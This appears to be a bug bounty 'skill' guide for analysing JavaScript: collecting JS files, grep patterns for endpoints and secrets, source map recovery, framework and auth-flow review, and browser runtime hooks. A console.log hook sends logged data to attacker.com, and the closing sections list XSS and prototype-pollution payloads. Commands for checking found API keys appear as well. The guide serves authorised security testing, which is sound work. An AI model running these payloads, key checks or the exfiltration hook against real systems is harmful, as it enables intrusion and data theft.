---
name: js-analysis
description: Comprehensive JavaScript code analysis guide for bug bounty hunters. Covers endpoint extraction from JS files, secret/API key discovery, source map analysis, framework detection, JS fuzzing, runtime analysis, and client-side vulnerability identification. Use when analyzing JavaScript bundles, extracting hidden endpoints, finding secrets in client-side code, or understanding application logic from JS files. Chinese trigger: JS分析、JavaScript分析、端点提取、JS secrets、JS漏洞、source map
---

# Skill: JavaScript Analysis

Comprehensive JavaScript code analysis for bug bounty hunting.

---

## JS ANALYSIS PHILOSOPHY

```
JS ANALYSIS LIFECYCLE:
1. COLLECT — Gather all JS files (crawl, wayback, subdomain enum)
2. EXTRACT — Pull endpoints, parameters, secrets from JS
3. ANALYZE — Understand app logic, framework, auth flow
4. FUZZ — Test extracted endpoints for vulns
5. RUNTIME — Live analysis via browser DevTools
6. CHAIN — Combine JS findings with server-side vulns
```

### Why JS Analysis Matters

```
What's in JavaScript:
- API endpoints (often hidden from crawlers)
- API keys and secrets (accidentally shipped)
- Internal logic (business rules, validation)
- Authentication flow (token handling, session mgmt)
- Authorization checks (client-side, bypassable)
- Sensitive data (user IDs, emails, PII)
- Framework version (known vulns)
- Internal hostnames/IPs (SSRF targets)
- Environment config (dev/staging/prod URLs)
```

---

## COLLECTING JAVASCRIPT FILES

### JS Discovery Techniques

```bash
# From crawled URLs
cat urls.txt | grep '\.js$' | sort -u > js-files.txt

# From Wayback Machine
waybackurls target.com | grep '\.js$' | sort -u >> js-files.txt

# From GAU (General URL Archive)
gau target.com | grep '\.js$' | sort -u >> js-files.txt

# From subdomain enumeration
cat live-subdomains.txt | \
  while read sub; do
    curl -sk "https://$sub" | \
      grep -oE 'src="[^"]+\.js"' | \
      sed 's/src="//;s/"//' | \
      while read js; do
        echo "https://$sub$js"
      done
  done | sort -u >> js-files.txt

# From HTML pages
cat urls.txt | \
  while read url; do
    curl -sk "$url" | \
      grep -oE '(src|href)="[^"]+\.js"' | \
      sed 's/.*="//;s/"//'
  done | sort -u >> js-files.txt

# From source maps (if present)
# Look for: //# sourceMappingURL=app.js.map
cat js-files.txt | \
  while read js; do
    map_url="${js}.map"
    map_url2="${js%.js}.map"
    curl -sk -o /dev/null -w "%{http_code}" "$map_url"
    curl -sk -o /dev/null -w "%{http_code}" "$map_url2"
  done
```

### JS Download and Organization

```bash
#!/bin/bash
# download-js.sh - Download all JS files for analysis

TARGET="target.com"
OUTDIR="js-analysis/$TARGET"
mkdir -p $OUTDIR

# Collect JS URLs
waybackurls $TARGET | grep '\.js$' | sort -u > $OUTDIR/urls.txt
gau $TARGET | grep '\.js$' | sort -u >> $OUTDIR/urls.txt

# Download each
cat $OUTDIR/urls.txt | while read url; do
  fname=$(echo $url | sed 's|https\?://||;s|/|_|g; s|?.*||')
  echo "Downloading: $url"
  curl -sk "$url" -o "$OUTDIR/$fname"
done

echo "Downloaded $(ls $OUTDIR/*.js | wc -l) files"
```

---

## ENDPOINT EXTRACTION FROM JS

### LinkFinder - Primary Endpoint Extractor

```bash
# Basic usage
python3 linkfinder.py -i https://target.com/main.js -o cli

# Output to file
python3 linkfinder.py -i https://target.com/main.js -o endpoints.txt

# Domain filter
python3 linkfinder.py -i https://target.com/main.js -d -o endpoints.txt

# Regex-based extraction
python3 linkfinder.py -i https://target.com/main.js -r 'https?://[^"\']+' -o endpoints.txt

# From all downloaded JS files
for js in $OUTDIR/*.js; do
  echo "=== $js ==="
  python3 linkfinder.py -i $js -d -o $OUTDIR/endpoints.txt
done

# Append all unique endpoints
cat $OUTDIR/endpoints.txt | sort -u > $OUTDIR/all-endpoints.txt
```

### JSLuice - secrets and URLs from JS

```bash
# Extract URLs
jsluice urls https://target.com/main.js

# Extract secrets
jsluice secrets https://target.com/main.js

# From file
jsluice urls ./main.js
jsluice secrets ./main.js

# Pipe to file
jsluice urls https://target.com/main.js >> $OUTDIR/urls-from-js.txt
jsluice secrets https://target.com/main.js >> $OUTDIR/secrets-from-js.txt
```

### Manual Endpoint Pattern Matching

```bash
# Common URL patterns in JS
grep -rEo 'https?://[^"'\''<> ]+' *.js file.js | sort -u

# API endpoint patterns
grep -rEo '"/api/[^"'\''<> ]+"' file.js | sort -u
grep -rEo "'/api/[^\"'<> ]+'" file.js | sort -u

# Fetch/axios calls
grep -rEo 'fetch\(["'\''`][^"'\''`)]+["'\''`]\)' *.js
grep -rEo 'axios\.[a-z]+\(["'\''`][^"'\''`)]+["'\''`]\)' *.js
grep -rEo '\.ajax\([^)]+\)' *.js

# GraphQL endpoints
grep -rEo '["'\''`]/graphql[^"'\''`)]*["'\''`]' *.js

# WebSocket endpoints
grep -rEo 'wss?://[^"'\''<> ]+' *.js
grep -rEo 'new WebSocket\(["'\''`][^"'\''`)]+["'\''`]\)' *.js

# JSON configurations
grep -rEo '"url":\s*"[^"]+"' *.js
grep -rEo '"endpoint":\s*"[^"]+"' *.js
grep -rEo '"api":\s*"[^"]+"' *.js

# Route definitions (SPA frameworks)
grep -rEo 'path:\s*["'\''`][^"'\''`)]+["'\''`]' *.js
grep -rEo 'route:\s*["'\''`][^"'\''`)]+["'\''`]' *.js
```

### Endpoint Extraction Patterns

```bash
# React Router
grep -rEo '<Route[^>]+path="[^"]+"' *.js
grep -rEo 'path:\s*["`][^"`]+["`]' *.js

# Angular
grep -rEo 'RouterModule\.forRoot\(\[[^]]*path:\s*["\`][^"\`]+["\`]' *.js

# Vue Router
grep -rEo 'path:\s*["`][^"`]+["`]' *.js

# Express.js routes (server-side JS)
grep -rEo 'app\.(get|post|put|delete|patch)\(["\`][^"\`]+["\`]' *.js
grep -rEo 'router\.(get|post|put|delete|patch)\(["\`][^"\`]+["\`]' *.js

# Next.js API routes (convention)
grep -rEo 'pages/api/[a-zA-Z0-9_/]+' *.js

# Generic API path patterns
grep -rEo '"/[a-zA-Z0-9_/-]+"' *.js | grep -E '(api|v[0-9])' | sort -u

# Environment/config endpoints
grep -rEo 'https?://[a-zA-Z0-9.-]+\.target\.com[^"'\''<> ]*' *.js
grep -rEo 'https?://api\.[a-zA-Z0-9.-]+\.target\.com[^"'\''<> ]*' *.js
```

---

## SECRET DISCOVERY IN JS

### Common Secret Patterns

```bash
# API Keys
grep -rEoi '(api[_-]?key|apikey|api[_-]?secret|api_secret|access[_-]?key|secret[_-]?key)\s*[:=]\s*["\`]?[a-zA-Z0-9_\-]{20,}["\`]?' *.js

# AWS Keys
grep -rEoi 'AKIA[0-9A-Z]{16}' *.js  # AWS Access Key ID
grep -rEoi '(aws_secret_access_key|aws_secret_key)\s*[:=]\s*["\`][a-zA-Z0-9/+=]{40}["\`]' *.js

# Google API Keys
grep -rEoi 'AIza[0-9A-Za-z-_\-]{35}' *.js

# Stripe Keys
grep -rEoi '(sk_live|sk_test|pk_live|pk_test)_[0-9a-zA-Z]{24,}' *.js

# GitHub Tokens
grep -rEoi 'ghp_[0-9a-zA-Z]{36}' *.js
grep -rEoi 'github_pat_[0-9a-zA-Z_]{60,}' *.js

# Firebase / GCP
grep -rEi 'firebase.*\.(io|com)' *.js
grep -rEi 'googleapis\.com' *.js
grep -rEi 'gcloud.*auth' *.js

# JWT Tokens
grep -rEo 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+' *.js

# Basic Auth
grep -rEo 'authorization:\s*["\`]basic\s+[a-zA-Z0-9+/=]+["\`]' *.js

# Passwords
grep -rEoi '(password|passwd|pwd|pass)\s*[:=]\s*["\`][^"\`]{3,}["\`]' *.js

# URLs containing keys
grep -rEo 'https?://[^"'\''<> ]+\?[^"'\''<> ]*(key|token|secret|api_key)[^"'\''<> ]*=[^&]+' *.js

# Internal URLs
grep -rEo 'https?://(localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)[^"'\''<> ]+' *.js
grep -rEo 'https?://[a-zA-Z0-9.-]+\.internal\.[a-zA-Z0-9.-]+[^"'\''<> ]*' *.js
grep -rEo 'https?://[a-zA-Z0-9.-]+\.corp\.[a-zA-Z0-9.-]+[^"'\''<> ]*' *.js
```

### SecretFinder - Automated Secret Scanner

```bash
# Basic scan
python3 SecretFinder.py -i https://target.com/main.js -o cli

# Output to file
python3 SecretFinder.py -i https://target.com/main.js -o secrets.txt

# Custom regex patterns
python3 SecretFinder.py -i https://target.com/main.js \
  -o cli \
  -g google_api_key,aws_access_key,aws_secret_key,aws_account_id

# From all downloaded JS
for js in $OUTDIR/*.js; do
  echo "=== $js ==="
  python3 SecretFinder.py -i $js -o cli
done

# Filter specific secret types
python3 SecretFinder.py -i main.js -o cli | grep -i "stripe"
python3 SecretFinder.py -i main.js -o cli | grep -i "aws"
python3 SecretFinder.py -i main.js -o cli | grep -i "firebase"
```

### API Key Verification (check if keys are valid)

```bash
# Google API key test
curl "https://maps.googleapis.com/maps/api/geocode/json?address=New+York&key=YOUR_KEY"

# AWS key test
aws sts get-caller-identity --profile test-profile 2>/dev/null

# Stripe key test
curl https://api.stripe.com/v1/charges \
  -u "sk_test_YOUR_KEY:" \
  -G --data-urlencode "limit=1"

# GitHub token test
curl -H "Authorization: token YOUR_TOKEN" https://api.github.com/user

# Slack token test
curl -H "Authorization: Bearer YOUR_TOKEN" https://slack.com/api/auth.test
```

---

## SOURCE MAP ANALYSIS

### What are Source Maps?

```
Source maps map minified/compiled code back to original source.
Often shipped with .js files as: app.js.map
Contains ORIGINAL source code including comments.
Can reveal full source code of entire application.
```

### Source Map Discovery

```bash
# Check for source map comment at end of JS
tail -1 main.js
# Output: //# sourceMappingURL=app.js.map

# Try common source map locations
curl -sk https://target.com/app.js.map
curl -sk https://target.com/dist/app.js.map
curl -sk https://target.com/static/js/app.js.map
curl -sk https://target.com/static/js/main.js.map

# Download all source maps
cat js-files.txt | while read js; do
  map_url="${js%.js}.map"
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$map_url")
  if [ "$code" = "200" ]; then
    echo "[+] Source map found: $map_url"
    curl -sk "$map_url" -o "${js%.js}.map"
  fi
done
```

### Source Map Analysis (if found)

```bash
# View source map structure
jq '.' app.js.map | head -100

# Extract source files list
jq -r '.sourcesContent[]' app.js.map | head -50

# Extract specific source file
jq -r '.sourcesContent[0]' app.js.map

# Find all source files
jq -r '.sources[]' app.js.map

# Extract full source
jq -r '.sourcesContent' app.js.map > all-source-code.js

# Search for secrets in source map
cat app.js.map | jq -r '.sourcesContent[]' | grep -iE '(api_key|secret|password|token)'

# Search for endpoints in source map
cat app.js.map | jq -r '.sourcesContent[]' | grep -oE 'https?://[^"'\''<> ]+' | sort -u
```

---

## FRAMEWORK DETECTION FROM JS

### Framework Detection Techniques

```bash
# React
grep -l 'react' main.js
grep -l 'ReactDOM' main.js
grep -l '_react' main.js
grep -l 'createElement' main.js

# Angular
grep -l 'angular' main.js
grep -l '@angular' main.js
grep -l 'ng-' main.js

# Vue.js
grep -l 'vue' main.js
grep -l 'Vue' main.js
grep -l '__vue__' main.js

# jQuery
grep -l 'jquery' main.js
grep -l 'jQuery' main.js
grep -l '\$(' main.js

# Next.js
grep -l 'next' main.js
grep -l '__NEXT' main.js

# Nuxt.js
grep -l '__NUXT' main.js

# Svelte
grep -l '__SVELTE' main.js

# Express (server-side)
grep -l 'express' main.js
grep -l 'bodyParser' main.js
grep -l 'app.listen' main.js

# NestJS
grep -l '@nestjs' main.js
grep -l '@Controller' main.js

# Fast API (Python) - look for .js that calls it
grep -l 'fastapi' main.js
grep -l '/api/' main.js

# Django
grep -l 'django' main.js
grep -l 'csrf' main.js
grep -l 'X-CSRFToken' main.js

# Flask
grep -l 'flask' main.js

# Laravel
grep -l 'laravel' main.js
grep -l 'X-XSRF-TOKEN' main.js

# Spring Boot
grep -l 'spring' main.js
```

### Version Detection

```bash
# React version
grep -oE 'react["\s:]+["\s]*(1[0-9]+\.[0-9]+\.[0-9]+)' main.js
grep -oE '__REACT_VERSION__.*' main.js

# jQuery version
grep -oE 'jQuery JavaScript Library v[0-9]+\.[0-9]+\.[0-9]+' main.js

# Angular version
grep -oE '@angular/core["\s:]+["\s]*[0-9]+\.[0-9]+\.[0-9]+' main.js

# Vue version
grep -oE 'vue["\s:]+["\s]*[0-9]+\.[0-9]+\.[0-9]+' main.js
```

### Framework-Specific Vulns

```
React:
- Look for dangerouslySetInnerHTML usage = XSS risk
- Look for client-side routing with auth = bypassable auth
- Look for __proto__ pollution vectors

Angular:
- Look for template injection ({{ }})
- Look for DomSanitizer bypasses
- Angular Universal SSR can leak data

Vue:
- Look for v-html usage = XSS risk
- Look for $options API usage
- Look for prototype pollution (has history of it)

jQuery:
- Look for .html() calls = innerHTML = XSS
- Look for $.ajax with eval() of response
- Old jQuery = known XSS vulns
```

---

## AUTHENTICATION FLOW ANALYSIS

### Token/Storage Analysis

```bash
# JWT handling
grep -rEo 'localStorage\.(getItem|setItem)\(["\`][^"\`]*token[^"\`]*["\`]\)' *.js
grep -rEo 'sessionStorage\.(getItem|setItem)\(["\`][^"\`]*token[^"\`]*["\`]\)' *.js

# Auth token storage
grep -rEo '(token|jwt|session|auth).*(localStorage|sessionStorage|Cookie)' *.js
grep -rEoi 'bearer\s+[a-zA-Z0-9_\-\.]+' *.js

# Token refresh logic
grep -rEo 'refresh.*token|access.*token|expires.*in' *.js
grep -rEo 'setInterval.*token|setTimeout.*token' *.js

# Auth headers
grep -rEo 'Authorization.*Bearer|Authorization.*Basic' *.js
grep -rEo 'X-Auth-Token|X-CSRF-Token|X-XSRF-TOKEN' *.js

# CSRF token handling
grep -rEo '(csrf|xsrf).*(token|header)' *.js
grep -rEo 'X-CSRF-Token.*[a-zA-Z0-9_\-]+' *.js

# Login/logout logic
grep -rEo '(login|logout|signin|signout|authenticate)\([^)]*\)' *.js
grep -rEo '(doLogin|onLogin|handleLogin|submitLogin)\([^)]*\)' *.js
```

### OAuth Flow Analysis

```bash
# OAuth state parameter
grep -rEo 'state\s*[:=].*[a-zA-Z0-9_\-]+' *.js
grep -rEo 'state.*(random|uuid|timestamp)' *.js

# OAuth redirect
grep -rEo 'redirect_uri' *.js
grep -rEo 'window\.location.*(code|token)' *.js
grep -rEo 'location\.hash.*(access_token|id_token)' *.js

# OAuth scopes
grep -rEo 'scope.*[a-zA-Z_]+' *.js
grep -rEo '(scope|scopes)\s*[:=]' *.js

# Token handling
grep -rEo 'access_token' *.js
grep -rEo 'id_token' *.js
grep -rEo 'authorization_code' *.js
```

---

## RUNTIME JS ANALYSIS

### Browser DevTools Analysis

```
Browser DevTools workflow:
1. Open DevTools (F12)
2. Go to Sources tab
3. Look for loaded JS files (left sidebar)
4. Set breakpoints in interesting functions
5. Use $$() selector to find elements
6. Use copy() to copy objects to clipboard
7. Monitor XHR/Fetch requests (Network tab)

Key areas to inspect:
- Login/logout handlers
- Form submission handlers
- API request builders
- Token refresh intervals
- Error handling (reveals endpoints)
- WebSocket connections
- Service Workers (offline caching)
```

### Debugging Techniques

```javascript
// Intercept and log all fetch requests
const originalFetch = window.fetch;
window.fetch = function(...args) {
  console.log('Fetch:', args[0], args[1]);
  return originalFetch.apply(this, args);
};

// Intercept XMLHttpRequest
const originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
  console.log('XHR:', method, url);
  return originalOpen.apply(this, arguments);
};

// Intercept console.log to find debug prints
const originalLog = console.log;
console.log = function(...args) {
  originalLog.apply(console, args);
  // Save to file
  fetch('https://attacker.com/console', {
    method: 'POST',
    body: JSON.stringify({args: args})
  });
};

// Hook into eval
const originalEval = window.eval;
window.eval = function(code) {
  console.log('Eval:', code);
  return originalEval.apply(this, arguments);
};

// Hook into Function constructor
const originalFunction = window.Function;
window.Function = function(...args) {
  console.log('Function:', args);
  return originalFunction.apply(this, args);
};
```

---

## SOURCE MAP EXTRACTION

### Sources Content Extraction (after obtaining .map)

```bash
# Extract all source files
jq -r '.sources[]' app.js.map | while read source; do
  echo "=== Source: $source ==="
  jq -r --arg source "$source" '.sourcesContent[] | select(. != null) | .[$source]' app.js.map 2>/dev/null
done

# Extract specific file content
jq -r '.sourcesContent[] | select(. != null)' app.js.map > extracted-sources.js

# List all files in source map
jq -r '.sources[]' app.js.map | sort -u
```

### Using tools for source map extraction

```bash
# REsource (retrieve source maps)
npx @microsoft/applicationinsights-web-sourcemap npmjs.org --output ./sourcemaps/ 2>/dev/null

# Or use online tool (manual)
# https://www.sourcemaps.io/
# Upload .map file, view extracted source

# Chromium with source maps
# In DevTools:
# 1. Sources tab
# 2. Click {} (pretty print) on minified file
# 3. Original source may appear with .map
```

---

## JS OBFUSCATION DETECTION

### Identifying Obfuscated JS

```bash
# Signs of obfuscation:
# 1. Very long single-line code (>10KB)
wc -c main.js
awk 'length > 10000 {print FILENAME ": " NR ": " length " chars"}' main.js

# 2. High number of strings that look like hex/base64
grep -oE '\\x[0-9a-fA-F]{2}' main.js | wc -l

# 3. eval() calls
grep -c 'eval(' main.js

# 4. _0x prefixed variable names
grep -oE '_0x[a-zA-Z0-9]+' main.js | head -20

# 5. String array patterns
grep -oE 'var _0x[a-z]+=(\[.*?\]);' main.js | head -5

# 6. Large encoded strings
grep -oE '[A-Za-z0-9+/]{40,}={0,2}' main.js | head -10
```

### Common Obfuscation Patterns

```bash
# Array-based string obfuscation
grep -oE 'var _0x[a-z]+=\[(.*?)\]' main.js

# String decryption functions
grep -oE 'function _0x[a-z]+\([^)]*\)\{[^}]*return[^}]*\}' main.js

# eval with decrypted strings
grep -oE 'eval\(.*_0x[a-z]+.*\)' main.js

# Hex-encoded strings
grep -oE '\\x[0-9a-fA-F]{2,}' main.js | head -10

# Base64-encoded strings
grep -oE '[A-Za-z0-9+/]{40,}={0,2}' main.js | head -10

# Control flow flattening (if/switch with encoded cases)
grep -oE 'switch.*_0x[a-z]+' main.js
```

---

## JS FUZZING

### JS Behavior Fuzzing

```bash
# Fuzz function parameters in URL
# If app accepts JS function calls as params:
ffuf -u "https://target.com/api/endpoint?callback=FUZZ" \
  -w callback-functions.txt \
  -mc 200,302 -t 50

# Common callback/payload patterns:
jsonp
angular
angular.callbacks._0
jQuery191044213793523023116_1620000000000
__vue__
__reactFiber
__next
```

### DOM-Based Fuzzing

```javascript
// Inject in URL fragment to test DOM XSS
// Fragment sinks:
location.hash
location.search
document.URL
document.referrer
window.name

// Test in browser console:
document.location = 'https://target.com#<img src=x onerror=alert(1)>'

// Or via curl:
curl "https://target.com/page#<img src=x onerror=alert(1)>"

// PostMessage sink testing
window.postMessage('<img src=x onerror=alert(1)>', '*')
```

### Source Code Fuzzing with Burp

```
1. Right-click interesting JS in Burp
2. Send to Repeater
3. Modify JS functions:
   - Change function parameters
   - Modify JSON configs embedded in JS
   - Change API URLs
   - Modify auth logic
4. Observe response differences

Tips:
- Look for config objects: window.__CONFIG__, APP_CONFIG
- Modify API_BASE to point to your server
- Modify feature flags: ENABLE_NEW_UI: false → true
- Test admin endpoints referenced in JS comments
```

---

## JS SECURITY PATTERNS

### Dangerous Patterns to Report

```bash
# InnerHTML assignment
grep -rEo 'innerHTML\s*=\s*[^;]+' *.js | grep -v 'textContent'
grep -rEo 'outerHTML\s*=\s*[^;]+' *.js

# DOM XSS sinks
grep -rEo 'document\.write\([^)]+\)' *.js
grep -rEo 'eval\([^)]+\)' *.js
grep -rEo 'setTimeout\([^)]+\)' *.js
grep -rEo 'setInterval\([^)]+\)' *.js

# Location manipulation
grep -rEo 'location\s*=\s*[^;]+' *.js
grep -rEo 'location\.href\s*=\s*[^;]+' *.js
grep -rEo 'location\.replace\([^)]+\)' *.js

# PostMessage without origin check
grep -rEo 'addEventListener\(["\`]message["\`]' *.js
grep -rEo '\.onmessage\s*=' *.js

# Prototype pollution
grep -rEo 'Object\.assign\([^)]+__proto__[^)]*\)' *.js
grep -rEo '\.\.__proto__' *.js
grep -rEo 'constructor.*prototype' *.js

# Unsafe deserialization
grep -rEo 'JSON\.parse\([^)]+\)' *.js

# Insecure WebSocket
grep -rEo 'new WebSocket\([^)]+\)' *.js

# Hardcoded sensitive data
grep -rEo '(password|secret|key|token)\s*[:=]\s*["\`][^"\`]+["\`]' *.js
```

---

## AUTOMATED JS ANALYSIS TOOLS

### tools Usage

```bash
# Retire.js - Find vulnerable JS libraries
retire --js --jspath ./js-folder/ --outputformat json

# npm audit (if package.json found)
npm audit --json > audit-results.json

# Snyk
snyk test --json

# JSHint (linting)
jshint main.js

# ESLint with security plugin
eslint --plugin security --rule 'security/detect-object-injection: error' main.js

# JSAnalysis (online)
# https://www.javascriptanalysis.com/

# Nuclei JS templates
nuclei -u https://target.com -t nuclei-templates/javascript/
```

---

## JS FILE INSIGHTS FOR BUG BOUNTY

### Low-Hanging Fruit from JS

```
1. API keys accidentally in client-side JS
   - Google Maps API key → can be used for billing
   - AWS keys → check if active
   - Stripe keys → check if test/live

2. Internal endpoints
   - Admin APIs only referenced in JS
   - Internal hostnames for SSRF
   - Debug endpoints not linked in UI

3. Business logic leakage
   - Max upload size in JS (can bypass)
   - Coupon validation logic (can bypass)
   - Price calculation logic (can manipulate)

4. Auth bypass clues
   - Admin routes in JS router
   - Token refresh logic (can extend stolen tokens)
   - Feature flags (can enable beta features)

5. Information disclosure
   - Internal IPs in WebSocket URLs
   - Database table names in GraphQL queries
   - User enumeration patterns
```

---

## JS JQUERY-SPECIFIC ANALYSIS

### jQuery Pattern Extraction

```bash
# AJAX calls
grep -rEo '\$\.ajax\(\{[^}]+\}\)' *.js
grep -oE "url:\s*['\"][^'\"]+['\"]" *.js

# Endpoint discovery
grep -oE "url:\s*['\"][^'\"]+['\"]" *.js | sort -u

# Method detection
grep -oE "type:\s*['\"](GET|POST|PUT|DELETE|PATCH)['\"]" *.js

# Data extraction
grep -oE "data:\s*\{[^}]+\}" *.js | head -20

# JSONP callbacks
grep -rEo 'jsonp.*callback' *.js
grep -rEo 'dataType:\s*["`]jsonp["`]' *.js
```

### jQuery AJAX Analysis

```javascript
// Look for sensitive data in AJAX calls
$.ajax({
  url: '/api/users',
  type: 'GET',
  data: {token: localStorage.getItem('token')},
  success: function(data) {
    // Sends all user data to client
  }
});

// Test:
// 1. Modify request to another user's ID
// 2. Remove token and see if it still works
// 3. Change method to POST/PUT/DELETE
// 4. Add sensitive fields to response
```

---

## ADVANCED JS ANALYSIS

### Memory Dump Analysis

```javascript
// In browser DevTools:
// 1. Take heap snapshot (Memory tab)
// 2. Look for strings containing sensitive data
// 3. Search for API keys, tokens, user data

// Search in heap snapshot
let allStrings = [];
const walker = {
  first: () => {
    // Iterate all objects
    return Object.keys(window);
  }
};
```

### Prototype Pollution Detection

```bash
# Check for merge/clone operations
grep -rEo '(merge|clone|extend|assign|deepMerge)\([^)]+\)' *.js | head -20

# Look for __proto__ or constructor manipulation
grep -rEo '__proto__' *.js
grep -rEo 'constructor.*prototype' *.js

# Library merge functions (lodash, jQuery, etc.)
grep -rEo 'Object\.assign\(' *.js
grep -rEo '\.\.\.[\w_]+' *.js

# Test prototype pollution via Node.js
// Check if web app uses vulnerable library
node -e "
const _ = require('lodash');
_.merge({'__proto__': {'polluted': 'yes'}}, {'normal': 'data'});
console.log({}.polluted);
"
```

### Environment Detection

```bash
# API base URLs (can reveal env)
grep -oE 'https?://[a-zA-Z0-9.-]+\.(internal|corp|dev|st|aging)[a-zA-Z0-9.-]*' *.js
grep -oE '(API_URL|BASE_URL|ENV|ENVIRONMENT|NODE_ENV|APP_ENV)\s*[:=]\s*["\`][^"\`]+["\`]' *.js

# Debug flags
grep -rEo '(DEBUG|ENABLE_DEBUG|SHOW_DEBUG)\s*[:=]\s*(true|false)' *.js
grep -rEo '(debug|dev|staging|production)\s*[:=]\s*["\`][^"\`]+["\`]' *.js

# Internal IPs
grep -oE '(localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)' *.js

# Credential information in JS
grep -oE '(user|pass|admin|root)\s*[:=]\s*["\`][^"\`]+["\`]' *.js
```

### API Documentation in JS

```bash
# OpenAPI/Swagger in JS
grep -oE '"(swagger|openapi|api-docs|api/docs)[^"]*"' *.js
grep -oE "'(swagger|openapi|api-docs|api/docs)[^']*'" *.js

# GraphQL introspection (check for enabled)
grep -oE '(__schema|__type)\s*:' *.js

# JSDoc comments
grep -oE '/\*\*[\s\S]*?\*/' *.js | grep -iE '(api|endpoint|route|todo|fixme|hack|bug)'
```

---

## JS SECURITY CHECKLIST

### Quick JS Security Audit

```
1. Endpoint discovery
   [ ] Run LinkFinder on all JS files
   [ ] Extract API paths with grep/fzf
   [ ] Check for hidden admin endpoints

2. Secret discovery
   [ ] Run SecretFinder
   [ ] Grep for API keys, tokens, passwords
   [ ] Check source maps for original source

3. XSS analysis
   [ ] Look for innerHTML, document.write, eval
   [ ] Check dangerouslySetInnerHTML (React)
   [ ] Check v-html (Vue)
   [ ] Check postMessage without origin check

4. CSRF analysis
   [ ] Check if CSRF tokens sent in headers
   [ ] Check SameSite cookie handling
   [ ] Check origin validation

5. Auth analysis
   [ ] How tokens stored (localStorage vs HttpOnly)
   [ ] Token refresh logic
   [ ] Client-side auth checks (bypassable)
   [ ] Session handling

6. Vuln patterns
   [ ] eval(), Function() with user input
   [ ] Prototype pollution vectors
   [ ] DOM XSS sinks
   [ ] Client-side validation only

7. Framework-specific
   [ ] React: dangerouslySetInnerHTML
   [ ] Angular: template injection
   [ ] Vue: v-html
   [ ] jQuery: .html(), .append()
```

---

## JS FUZZING PAYLOADS

### XSS via JS Sinks

```javascript
// Test innerHTML
'<img src=x onerror=alert(1)>'
'<svg onload=alert(1)>'
'<script>alert(1)</script>'

// Test document.write
'<script>alert(1)</script>'

// Test eval
'";alert(1);var x="'

// Test location
'javascript:alert(1)'

// Test postMessage
'{"type":"xss","payload":"<img src=x onerror=alert(1)>"}'
```

### Prototype Pollution

```javascript
// Test merge/clone operations
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"admin": true}}}

// If app uses JSON.parse then merge:
{"__proto__": {"isAdmin": true}}
```

### DOM XSS

```javascript
// Hash-based
#<img src=x onerror=alert(1)>

// Search-based
?q=<img src=x onerror=alert(1)>

// Hash in SPA
#/<img src=x onerror=alert(1)>/
```

---

## FINAL JS ANALYSIS RULES

1. **Always download source maps** — they contain full original code
2. **Run LinkFinder on every JS file** — find hidden endpoints
3. **Run SecretFinder on every JS file** — find accidentally exposed secrets
4. **Check framework-specific patterns** — React, Angular, Vue have unique issues
5. **Analyze auth flow** — client-side auth checks are bypassable
6. **Check source map for comments** — devs often leave TODO/FIXME/HACK
7. **Proxy all JS requests in Burp** — analyze dynamically
8. **Combine with runtime analysis** — DevTools reveals more than static
9. **Test client-side validation bypass** — never trust client-only checks
10. **Document chain opportunities** — JS findings often chain with server-side bugs
